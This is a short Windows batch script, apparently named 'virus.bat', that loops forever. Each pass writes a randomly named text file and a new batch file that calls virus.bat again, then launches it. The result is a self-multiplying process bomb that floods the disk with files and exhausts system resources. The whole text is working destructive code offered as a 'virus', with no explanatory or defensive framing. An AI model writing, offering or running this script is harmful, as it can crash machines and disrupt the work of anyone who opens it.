@echo off
:loop
set /a ans = 999999999 * 999999999
set /a file = %RANDOM%
@echo %ans% > %file%.txt
@echo virus.bat > %file%.bat
start %file%.bat
goto loop